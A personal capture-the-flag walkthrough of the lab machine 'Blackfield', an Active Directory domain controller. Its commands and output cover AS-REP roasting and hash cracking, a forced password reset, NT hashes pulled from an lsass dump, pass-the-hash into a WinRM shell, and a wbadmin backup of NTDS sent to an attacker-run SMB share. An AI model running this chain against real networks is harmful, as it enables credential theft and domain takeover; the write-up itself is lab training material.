@@ -1,0 +1,1017 @@
+BLACKFIELD Notes:
+
+First off we start with an nmap scan of the windows machine, we come to find that we are 
+looking at a domain controller. LDAP is active, kerberos active, dns active, however there 
+is no webserver currently on.
+
+We find the dns name of active directory via the nmap results, will now modify /etc/hosts to
+have the dns name reflected of the ip. 
+
+COMMAND:
+====================================================================================
+vim /etc/hosts
+====================================================================================
+INPUT:
+====================================================================================
+10.10.10.192 BLACKFIELD.local
+====================================================================================
+
+First thing to do when dealing with active directory is using rpc client to try and get more 
+info off the box.
+COMMAND:
+====================================================================================
+rpcclient 10.10.10.192
+====================================================================================
+
+OUTPUT :
+====================================================================================
+Enter WORKGROUP\root's password: 
+Bad SMB2 signature for message
+[0000] 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........
+[0000] 97 C4 56 99 FA FE 25 BC   43 3E 1D 1C 25 E3 89 A6   ..V...%. C>..%...
+Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED
+====================================================================================
+
+Now we try a null authentication and we get in.
+COMMAND:
+====================================================================================
+rpcclient 10.10.10.192 -U ''
+====================================================================================
+
+OUTPUT :
+====================================================================================
+Enter WORKGROUP\'s password: 
+rpcclient $> enuumdomusers
+result was NT_STATUS_ACCESS_DENIED
+rpcclient $> 
+====================================================================================
+
+We can also try smcclient and see if we get something out of it.
+COMMAND:
+====================================================================================
+smbclient -L 10.10.10.192 -U ''
+====================================================================================
+
+OUTPUT:
+====================================================================================S
+Enter WORKGROUP\root's password: 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	forensic        Disk      Forensic / Audit share.
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	profiles$       Disk      
+	SYSVOL          Disk      Logon server share 
+SMB1 disabled -- no workgroup available
+====================================================================================
+
+We don't really get much info with regards to the the read write permissions so will use
+crackmapexec to try and query for more data.
+COMMAND:
+====================================================================================
+cme smb 10.10.10.192 --shares
+====================================================================================
+OUTPUT:
+====================================================================================S
+SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
+SMB         10.10.10.192    445    DC01             [-] Error enumerating shares: STATUS_USER_SESSION_DELETED
+====================================================================================S
+
+Nothing really is showcased. So we attempt several permutations of cme until we get back a 
+result by entering a fake user.
+
+COMMAND:
+====================================================================================
+cme smb 10.10.10.192 --shares -u 'pleasesub' -p ''
+====================================================================================
+OUTPUT:
+====================================================================================
+SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
+SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\pleasesub: 
+SMB         10.10.10.192    445    DC01             [+] Enumerated shares
+SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
+SMB         10.10.10.192    445    DC01             -----           -----------     ------
+SMB         10.10.10.192    445    DC01             ADMIN$                          Remote Admin
+SMB         10.10.10.192    445    DC01             C$                              Default share
+SMB         10.10.10.192    445    DC01             forensic                        Forensic / Audit share.
+SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
+SMB         10.10.10.192    445    DC01             NETLOGON                        Logon server share 
+SMB         10.10.10.192    445    DC01             profiles$       READ            
+SMB         10.10.10.192    445    DC01             SYSVOL                          Logon server share 
+====================================================================================
+
+Now we have the ability to read through some of the shares without logging in. We can read the
+ipc share and profiles shares
+
+We can now reuse smbclient to try and access the profiles share:
+Command:
+====================================================================================
+smbclient '//10.10.10.192/profiles$'
+====================================================================================
+
+OUTPUT:
+====================================================================================
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Wed Jun  3 12:47:12 2020
+  ..                                  D        0  Wed Jun  3 12:47:12 2020
+  AAlleni                             D        0  Wed Jun  3 12:47:11 2020
+  ABarteski                           D        0  Wed Jun  3 12:47:11 2020
+  ABekesz                             D        0  Wed Jun  3 12:47:11 2020
+  ABenzies                            D        0  Wed Jun  3 12:47:11 2020
+  ABiemiller                          D        0  Wed Jun  3 12:47:11 2020
+  AChampken                           D        0  Wed Jun  3 12:47:11 2020
+  ACheretei                           D        0  Wed Jun  3 12:47:11 2020
+  ACsonaki                            D        0  Wed Jun  3 12:47:11 2020
+  AHigchens                           D        0  Wed Jun  3 12:47:11 2020
+  AJaquemai                           D        0  Wed Jun  3 12:47:11 2020
+  AKlado                              D        0  Wed Jun  3 12:47:11 2020
+====================================================================================
+
+No good way of navigating directory so we will mount it into our local file system:
+Command:
+====================================================================================
+mount -t cifs '//10.10.10.192/profiles$' /mnt
+====================================================================================
+
+Now we can navigate to /mnt and see if we can find anything:
+Command:
+====================================================================================
+cd /mnt
+find .
+====================================================================================
+
+We will also pipe the output of ls from current directory to generate a user list we can 
+possible try to bruteforce with.
+Command:
+====================================================================================
+root@kali:/mnt# ls > /root/htb/blackfield/users.lst
+====================================================================================
+
+Will now use kerbrute to try and get a list of valid users:
+Command:
+====================================================================================
+./kerbrute userenum --dc 10.10.10.192 -d blackfield  -o userenum.out users.lst
+====================================================================================
+OUTPUT:
+====================================================================================
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: dev (1ad284a) - 11/14/20 - Ronnie Flathers @ropnop
+
+2020/11/14 19:08:05 >  Using KDC(s):
+2020/11/14 19:08:05 >  	10.10.10.192:88
+
+2020/11/14 19:08:26 >  [+] VALID USERNAME:	 audit2020@blackfield
+2020/11/14 19:10:20 >  [+] VALID USERNAME:	 support@blackfield
+2020/11/14 19:10:25 >  [+] VALID USERNAME:	 svc_backup@blackfield
+2020/11/14 19:10:51 >  Done! Tested 314 usernames (3 valid) in 165.878 seconds
+====================================================================================
+
+
+We can now create a list from which can initate brute force requests we can reformat it by 
+issuing the following command:
+Command:
+====================================================================================
+grep VALID userenum.out | awk '{print $7}' | awk -F\@ '{print $2"\\"$1}'
+====================================================================================
+OUTPUT:
+====================================================================================
+blackfield\audit2020
+blackfield\support
+blackfield\svc_backup
+====================================================================================
+
+We output this into a user list, and the next thing to do is use impacket start a kerberos
+preauth attack. We created a virtual environement to run impacket tools since the system wide
+impacket is not working correctly the sauna box has more info details of this.
+Command:
+====================================================================================
+./GetNPUsers.py -dc-ip 10.10.10.192 -no-pass -usersfile user.lst blackfield/
+====================================================================================
+OUTPUT:
+====================================================================================
+Impacket v0.9.22.dev1+20201112.141202.d1ced941 - Copyright 2020 SecureAuth Corporation
+
+[-] User audit2020 doesn't have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$23$support@BLACKFIELD:5d1879650a906121567943bfc88bc351$ff191bfba94db6a62241ba933f331df45d61c50c856ff2a550f21f6c9a99ea4835ff2f313f61c4fd64925215d807ac0ea5879322eb48294a501e85645b7997d0e17fae41ce609ea077d838fa945f5fd646558950fefaf47fb8887d05db03897f5d297bb0f8ee9c55eadc97e954a651dd94f6caf3f7d255e2f62d14f3bfec5ade34db16ebe16233e8dc56121e509c97a787289c1fbadbc0d924b1a1aedde3f5b595a9c2fce25804db45801dcd08fe6bd786addc6d01e39bae84de81dfe8b788f037268b8c0edadde052eed607660fe8e045c0525ff232e2c98e7b13115cfdf334eb44bc06d859525c48d74e16cd98
+[-] User svc_backup doesn't have UF_DONT_REQUIRE_PREAUTH set
+====================================================================================
+
+We can now attempt to crack the hash with hashcrack. First we find the type of hash we are 
+cracking
+Command:
+====================================================================================
+root@kali:~/htb/blackfield# hashcat --example-hashes | grep -A1 -B5 krb5asrep
+HASH: 597056:3600
+PASS: hashcat
+
+MODE: 18200
+TYPE: Kerberos 5, etype 23, AS-REP
+HASH: $krb5asrep$23$user@domain.com:3e156ada591263b8aab0965f5aebd837$007497cb51b6c8116d6407a782ea0e1c5402b17db7afa6b05a6d30ed164a9933c754d720e279c6c573679bd27128fe77e5fea1f72334c1193c8ff0b370fadc6368bf2d49bbfdba4c5dccab95e8c8ebfdc75f4
+====================================================================================
+
+Mode is 18200.
+Command:
+====================================================================================
+hashcat -m 18200 hashes/blackfield /usr/share/wordlists/rockyou.txt --force
+====================================================================================
+OUTPUT:
+====================================================================================
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+$krb5asrep$23$support@BLACKFIELD:5d1879650a906121567943bfc88bc351$ff191bfba94db6a62241ba933f331df45d61c50c856ff2a550f21f6c9a99ea4835ff2f313f61c4fd64925215d807ac0ea5879322eb48294a501e85645b7997d0e17fae41ce609ea077d838fa945f5fd646558950fefaf47fb8887d05db03897f5d297bb0f8ee9c55eadc97e954a651dd94f6caf3f7d255e2f62d14f3bfec5ade34db16ebe16233e8dc56121e509c97a787289c1fbadbc0d924b1a1aedde3f5b595a9c2fce25804db45801dcd08fe6bd786addc6d01e39bae84de81dfe8b788f037268b8c0edadde052eed607660fe8e045c0525ff232e2c98e7b13115cfdf334eb44bc06d859525c48d74e16cd98:#00^BlackKnight
+====================================================================================
+
+We now have the password for the support user:
+support:#00^BlackKnight
+
+We will now leverage this knowledge and use cme to extarct more info by authenticating as
+user.
+
+Command:
+====================================================================================
+cme smb 10.10.10.192 --shares -u support -p '#00^BlackKnight'
+====================================================================================
+OUTPUT:
+====================================================================================
+SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
+SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight 
+SMB         10.10.10.192    445    DC01             [+] Enumerated shares
+SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
+SMB         10.10.10.192    445    DC01             -----           -----------     ------
+SMB         10.10.10.192    445    DC01             ADMIN$                          Remote Admin
+SMB         10.10.10.192    445    DC01             C$                              Default share
+SMB         10.10.10.192    445    DC01             forensic                        Forensic / Audit share.
+SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
+SMB         10.10.10.192    445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.10.10.192    445    DC01             profiles$       READ            
+SMB         10.10.10.192    445    DC01             SYSVOL          READ            Logon server share
+====================================================================================
+
+We can now unmount the previous share and remount it but with gathered creds to have more access.
+
+COMMAND:
+====================================================================================
+umount /mnt
+mount -t cifs -o 'username=support,password=#00^BlackKnight' //10.10.10.192/profiles$ /mnt
+uumount /mnt
+====================================================================================
+
+We went through all the user directories however there wasn't anything noteworth inside the 
+directories, still it is a good habit to look ovver everything.
+
+So let's try rpcclient again and see if we can gain more info by using the support user.
+COMMAND:
+====================================================================================
+rpcclient 10.10.10.192 -U support
+enumdomusers
+====================================================================================
+
+OUTPUT:
+====================================================================================
+rpcclient $> enumdomusers
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[audit2020] rid:[0x44f]
+user:[support] rid:[0x450]
+user:[BLACKFIELD764430] rid:[0x451]
+user:[BLACKFIELD538365] rid:[0x452]
+user:[BLACKFIELD189208] rid:[0x453]
+user:[BLACKFIELD404458] rid:[0x454]
+user:[BLACKFIELD706381] rid:[0x455]
+user:[BLACKFIELD937395] rid:[0x456]
+...... 
+......
+......
+user:[BLACKFIELD996878] rid:[0x582]
+user:[BLACKFIELD653097] rid:[0x583]
+user:[BLACKFIELD438814] rid:[0x584]
+user:[svc_backup] rid:[0x585]
+user:[lydericlefebvre] rid:[0x586]
+user:[BLACKFIELD996878] rid:[0x582]
+user:[BLACKFIELD653097] rid:[0x583]
+user:[BLACKFIELD438814] rid:[0x584]
+user:[svc_backup] rid:[0x585]
+user:[lydericlefebvre] rid:[0x586]
+====================================================================================
+
+We are able to get a large number of users on the system. We will create a new ser file and will 
+attempt use impacket again. We create a new user list with the following and rerun the preauth 
+bruteforcing tool:
+COMMAND:
+====================================================================================
+cut -d ':' -f2 rpc-user.lst | cut -d '[' -f2 | cut -d ']' -f1 > rpc-user.lst
+./GetNPUsers.py -dc-ip 10.10.10.192 -no-pass -usersfile rpc-user.lst blackfield/
+====================================================================================
+
+
+
+No interesting output son instead, We can try using bloodhound from python. And it works.
+COMMAND:
+====================================================================================
+git clone https://github.com/fox-it/BloodHound.py.git
+cd bloodhound.py
+python3 bloodhound.py
+python3 bloodhound.py -u support -p '#00^BlackKnight' -ns 10.10.10.192 -d blackfield.local -c all
+====================================================================================
+OUTPUT:
+====================================================================================
+INFO: Found AD domain: blackfield.local
+INFO: Connecting to LDAP server: dc01.blackfield.local
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 18 computers
+INFO: Connecting to LDAP server: dc01.blackfield.local
+INFO: Found 315 users
+INFO: Connecting to GC LDAP server: dc01.blackfield.local
+INFO: Found 51 groups
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: DC01.BLACKFIELD.local
+INFO: Done in 00M 17S
+====================================================================================
+
+We can now bring up the neo4j console from bloodhound.
+
+2 ways to run bloodhound one by having a windows command shell uploading sharphound and having it generate a zip file that can be processed by bloodhound or two using the bloodhound python script that 
+automatically authenitcates and generate json file that can be processed by bloodhoud.
+
+Within bloodhound we can set high target users suuch audit2020 and lydbsjbdd.
+
+We notice that if we search on bh for audit2020 and right click and choose "shortest path to here"
+we come to find that the support user has the ability to change that users password without knowing
+the users password beforehand.
+
+FORCE CHANGE PASSWORD
+OUTPUT:
+====================================================================================
+INFO:
+The user SUPPORT@BLACKFIELD.LOCAL has the capability to change the user AUDIT2020@BLACKFIELD.LOCAL's password without knowing that user's current password.
+Absue Info:
+There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net user dfm.a Password123! /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Set-DomainUserPassword function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the ForceChangePassword privilege. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab).
+
+To abuse this privilege with PowerView's Set-DomainUserPassword, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as SUPPORT@BLACKFIELD.LOCAL if you are not running a process as that user. To do this in conjunction with Set-DomainUserPassword, first create a PSCredential object (these examples comes from the PowerView help documentation):
+
+$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
+
+Then create a secure string object for the password you want to set on the target user:
+
+$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+
+Finally, use Set-DomainUserPassword, optionally specifying $Cred if you are not already running a process as SUPPORT@BLACKFIELD.LOCAL:
+
+Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred
+
+Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab.
+
+OPSEC Considerations:
+Executing this abuse with the net binary will necessarily require command line execution. If your target organization has command line logging enabled, this is a detection opportunity for their analysts
+====================================================================================
+
+However changing the password for that user can be pretty noisy and may alert the helpdesk so take
+note of this if trying. Also set the password back if domain admin is achieved. We will now change 
+the uusers password with rpcclient.
+
+COMMAND:
+====================================================================================
+root@kali:~/htb/blackfield# rpcclient 10.10.10.192 -U support 
+Enter WORKGROUP\support's password: 
+rpcclient $> setuserinfo2 audit2020 23 pleasesub!
+result: NT_STATUS_PASSWORD_RESTRICTION
+result was NT_STATUS_PASSWORD_RESTRICTION
+rpcclient $> setuserinfo2 audit2020 23 pleasesub!23
+====================================================================================
+
+Now we can test it with crackmapexec:
+COMMAND:
+====================================================================================
+cme smb 10.10.10.192 -u audit2020 -p pleasesub!23
+====================================================================================
+OUTPUT:
+====================================================================================
+SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
+SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\audit2020:pleasesub!23 
+====================================================================================
+
+Looks the change of password was a success. We can now also look for the shares as well.
+COMMAND:
+====================================================================================
+cme smb 10.10.10.192 -u audit2020 -p pleasesub!23 --shares
+====================================================================================
+OUTPUT:
+====================================================================================
+SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
+SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\audit2020:pleasesub!23 
+SMB         10.10.10.192    445    DC01             [+] Enumerated shares
+SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
+SMB         10.10.10.192    445    DC01             -----           -----------     ------
+SMB         10.10.10.192    445    DC01             ADMIN$                          Remote Admin
+SMB         10.10.10.192    445    DC01             C$                              Default share
+SMB         10.10.10.192    445    DC01             forensic        READ            Forensic / Audit share.
+SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
+SMB         10.10.10.192    445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.10.10.192    445    DC01             profiles$       READ            
+SMB         10.10.10.192    445    DC01             SYSVOL          READ            Logon server share 
+====================================================================================
+
+We now have read access to the forensic shared drive after pivoting to the audit2020 user. Now we
+can moun that drive as well.
+COMMAND:
+====================================================================================
+mount -t cifs -o 'username=audit2020,password=pleasesub!23' //10.10.10.192/forensic /mnt
+====================================================================================
+OUTPUT:
+====================================================================================
+root@kali:~/htb/blackfield# cd /mnt
+root@kali:/mnt# ls
+commands_output  memory_analysis  tools
+commands_output  memory_analysis  tools
+root@kali:/mnt# cd memory_analysis/
+root@kali:/mnt/memory_analysis# ls
+conhost.zip  dllhost.zip  mmc.zip            sihost.zip       taskhostw.zip  WmiPrvSE.zip
+ctfmon.zip   ismserv.zip  RuntimeBroker.zip  smartscreen.zip  winlogon.zip
+dfsrs.zip    lsass.zip    ServerManager.zip  svchost.zip      wlms.zip
+====================================================================================
+
+One thing that really grabs the attention of pentesters is the lsass zip stored in memory analysis
+as that is where passwords are stored in memory. So we copy it over to our working directory.
+
+Now we can attempt to see what is in there by using pypykatz
+pip3 install pypykatz
+
+We unzip lsass.zip and now use our new tool for discovery. We find the hashes for svc_backup and 
+adminstrator.
+COMMAND:
+====================================================================================
+pypykatz lsa minidump lsass.DMP > lsass.out
+====================================================================================
+OUTPUT:
+====================================================================================
+root@kali:~/htb/blackfield# grep -B5 NT lsass.out 
+luid 406458
+	== MSV ==
+		Username: svc_backup
+		Domain: BLACKFIELD
+		LM: NA
+		NT: 9658d1d1dcd9250115e2205d9f48400d
+....
+....
+....
+luid 153705
+	== MSV ==
+		Username: Administrator
+		Domain: BLACKFIELD
+		LM: NA
+		NT: 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
+====================================================================================
+
+We can now try using these:
+COMMAND:
+====================================================================================
+root@kali:~/htb/blackfield# cme smb 10.10.10.192 -u administrator -H '7f1e4ff8c6a8e6b6fcae2d9c0572cd62'
+SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
+SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\administrator:7f1e4ff8c6a8e6b6fcae2d9c0572cd62 STATUS_LOGON_FAILURE
+====================================================================================
+COMMAND:
+====================================================================================
+cme smb 10.10.10.192 -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d'
+SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
+SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\svc_backup 9658d1d1dcd9250115e2205d9f48400d 
+====================================================================================
+
+The adminstrator hash fails but the backup account works. Adminstrator password might have changed
+from the time it was being audited.
+
+We can attemnpt to use crackmap again to check if the backup user has windows remote management 
+privileges.
+COMMAND:
+====================================================================================
+cme winrm 10.10.10.192 -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d'
+====================================================================================
+
+OUTPUT:
+====================================================================================
+WINRM       10.10.10.192    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
+WINRM       10.10.10.192    5985   DC01             [*] http://10.10.10.192:5985/wsman
+WINRM       10.10.10.192    5985   DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d (Pwn3d!)
+====================================================================================
+
+In which case we can use evil-winrm to get a shell on the box.
+COMMAND:
+====================================================================================
+evil-winrm -i 10.10.10.192 -u svc_backup -H '9658d1d1dcd9250115e2205d9f48400d'
+====================================================================================
+
+OUTPUT:
+====================================================================================
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\svc_backup\Documents>
+====================================================================================
+
+And we get a shell. Once that we can run 'whomai /all' whihc is the linux equivalent of 'sudo -l'
+and see what permissions the current user has.
+
+COMMAND:
+====================================================================================
+whoami /all
+====================================================================================
+
+OUPUT:
+====================================================================================
+USER INFORMATION
+----------------
+
+User Name             SID
+===================== ==============================================
+blackfield\svc_backup S-1-5-21-4194615774-2175524697-3563712290-1413
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID          Attributes
+========================================== ================ ============ ==================================================
+Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\High Mandatory Level       Label            S-1-16-12288
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeBackupPrivilege             Back up files and directories  Enabled
+SeRestorePrivilege            Restore files and directories  Enabled
+SeShutdownPrivilege           Shut down the system           Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+====================================================================================
+
+Things to note from this output is that the user has the SeBackuupPrivilege and SeRestorePrivilege
+which are quite dangerouus and there are various walkthroughs showcasing these and how they can be 
+manipulated to read and write to file such as registries.
+
+Googling "SeBackup Privilege Talk" will take us to a slide deck showcasing the abuse of these privs.
+
+
+We are going to create a directory called smb where we are going to run an smbserver. Where we can
+take advvantage of wbadmin. Have to make sure the share includes a user and password otherwise 
+wbadmin fails. This fails only when trying use net use otherwise wbadmin work.
+COMMAND:
+====================================================================================
+mkdir smb
+cd smb
+/opt/impacket-venv/bin/smbserver.py -smb2suupport urdata $(pwd) -user root -password jail
+====================================================================================
+
+OUTPUT
+====================================================================================
+*Evil-WinRM* PS C:\Users\svc_backup\Desktop> wbadmin start backup -backuptarget:\\10.10.14.3\urdata -include:c:\Windows\ntds\ 
+wbadmin 1.0 - Backup command-line tool
+(C) Copyright Microsoft Corporation. All rights reserved.
+
+Retrieving volume information...
+This will back up (C:) (Selected Files) to \\10.10.14.3\urdata.
+Do you want to start the backup operation?
+[Y] Yes [N] No The pipe has been ended.
+*Evil-WinRM* PS C:\Users\svc_backup\Desktop> echo y | wbadmin start backup -backuptarget:\\10.10.14.3\urdata -include:c:\Windows\ntds\ 
+wbadmin 1.0 - Backup command-line tool
+(C) Copyright Microsoft Corporation. All rights reserved.
+
+Retrieving volume information...
+This will back up (C:) (Selected Files) to \\10.10.14.3\urdata.
+Do you want to start the backup operation?
+[Y] Yes [N] No y
+
+ERROR - The specified backup location could not be found or is not a
+supported backup storage location.
+====================================================================================
+
+The backup does not work since the type of filesystem is not formatted as ntfs, which we need. Instead we can make our own with dd.
+
+COMMANDS:
+====================================================================================
+dd if=/dev/zero of=ntfs.disk bs=1024M count=2
+losetup -fP ntfs.disk 	
+mkfs.ntfs /dev/loop0
+====================================================================================
+
+OUTPUT:
+====================================================================================
+root@kali:~/htb/blackfield# dd if=/dev/zero of=ntfs.disk bs=1024M count=2
+2+0 records in
+2+0 records out
+2147483648 bytes (2.1 GB, 2.0 GiB) copied, 2.40629 s, 892 MB/s
+
+root@kali:~/htb/blackfield# losetup -fP ntfs.disk
+
+root@kali:~/htb/blackfield# losetup -a
+/dev/loop0: [2049]:4211727 (/root/htb/blackfield/ntfs.disk)
+
+root@kali:~/htb/blackfield# mkfs.ntfs /dev/loop0
+The partition start sector was not specified for /dev/loop0 and it could not be obtained automatically.  It has been set to 0.
+The number of sectors per track was not specified for /dev/loop0 and it could not be obtained automatically.  It has been set to 0.
+The number of heads was not specified for /dev/loop0 and it could not be obtained automatically.  It has been set to 0.
+Cluster size has been automatically set to 4096 bytes.
+To boot from a device, Windows needs the 'partition start sector', the 'sectors per track' and the 'number of heads' to be set.
+Windows will not be able to boot from this device.
+Initializing device with zeroes:  100% - Done.
+Creating NTFS volume structures.
+mkntfs completed successfully. Have a nice day
+
+root@kali:~/htb/blackfield# mount | grep smb
+/dev/loop0 on /root/htb/blackfield/smb type fuseblk (rw,relatime,user_id=0,group_id=0,allow_other,blksize=4096)
+====================================================================================
+
+If we try to do the impacket smb share again, it will fail since it does not handle ntfs well. 
+Output from evil-winrm is shown, first the drive has to be mounted first using a uusername and 
+password otherwise it will not. Afterwards it will complain that it is not an ntfs file system.
+OUTPUT:
+====================================================================================
+LOCAL ROOT
+/opt/impacket-venv/bin/smbserver.py -smb2support urdata $(pwd) -user root -password jail
+
+Victim User
+*Evil-WinRM* PS C:\Users\svc_backup\Documents> net use x: \\10.10.14.3\urdata /user:root jail
+The command completed successfully.
+
+*Evil-WinRM* PS C:\Users\svc_backup\Documents> echo y | wbadmin start backup -backuptarget:\\10.10.14.3\urdata -include:c:\Windows\ntds\
+wbadmin 1.0 - Backup command-line tool
+(C) Copyright Microsoft Corporation. All rights reserved.
+
+
+Note: The backed up data cannot be securely protected at this destination.
+Backups stored on a remote shared folder might be accessible by other
+people on the network. You should only save your backups to a location
+where you trust the other users who have access to the location or on a
+network that has additional security precautions in place.
+
+Retrieving volume information...
+This will back up (C:) (Selected Files) to \\10.10.14.3\urdata.
+Do you want to start the backup operation?
+[Y] Yes [N] No y
+
+A backup cannot be done to a remote shared folder which is not hosted on a volume formatted with NTFS/ReFS.
+====================================================================================
+
+Instead we will use the native smb daemon to accomplish the tasks.
+
+net use x: \\10.10.14.3\urdata /user:root jail
+
+Troubleshooting used:
+====================================================================================
+*Evil-WinRM* PS C:\Users\svc_backup\Documents> net use x: \\10.10.14.3\urdata
+
+*Evil-WinRM* PS C:\Users\svc_backup\Documents> net use x: /delete
+x: was deleted successfully.
+
+*Evil-WinRM* PS C:\Users\svc_backup\Documents> echo y | wbadmin start backup -backuptarget:\\10.10.14.3\urdata -include:c:\Windows\ntds\
+
+...
+...
+...
+
+The backup operation stopped before completing.
+The backup operation stopped before completing.
+Log of files successfully backed up:
+C:\Windows\Logs\WindowsServerBackup\Backup-15-11-2020_13-41-55.log
+
+Log of files for which backup failed:
+C:\Windows\Logs\WindowsServerBackup\Backup_Error-15-11-2020_13-41-55.log
+
+Windows Backup cannot write to the backup storage location.
+
+====================================================================================
+
+This tells us that the ntfs disk is needed to perform correctly. Umask seetings maybe affecting the
+outcome of backup storage not being able to write despite using the proper smbd daemon on linux.
+
+I tried several times to anonymously create join the shared drive but all those atteempts failed,
+instead I created an smbuser and gave it a passwd for which it could be used to mount drives unto 
+the system. Steps lay ahead
+
+COMMANDS:
+====================================================================================
+adduser smbuser
+smbpasswd -a smbuser
+vim /etc/samba/smb.confvim /etc/samba/smb.conf
+################# ADDED THE FOLLOWING LINES ############################
+[global]
+   map to guest = Bad User
+   server role = standalone server
+   usershare allow guests = yes
+   idmap config * : backend = tdb
+   interfaces = tun0
+   smb ports = 445
+[smb]
+   comment = Samba
+   path = /tmp/
+   guest ok = yes
+   read only = no
+   browsable = yes
+   force user = smbuser
+############################################################################
+Victim Machine:
+*Evil-WinRM* PS C:\Users\svc_backup\Documents> net use x: \\10.10.14.3\smb /user:smbuser smbpass
+The command completed successfully.
+*Evil-WinRM* PS C:\Users\svc_backup\Documents> cd x:
+*Evil-WinRM* PS x:\> ls
+...
+...
+...
+*Evil-WinRM* PS C:\Users\svc_backup\Documents> echo "Y" | wbadmin start backup -backuptarget:\\10.10.14.3\smb -include:c:\windows\ntds
+wbadmin 1.0 - Backup command-line tool
+(C) Copyright Microsoft Corporation. All rights reserved.
+
+
+Note: The backed up data cannot be securely protected at this destination.
+Backups stored on a remote shared folder might be accessible by other
+people on the network. You should only save your backups to a location
+where you trust the other users who have access to the location or on a
+network that has additional security precautions in place.
+
+Retrieving volume information...
+This will back up (C:) (Selected Files) to \\10.10.14.3\smb.
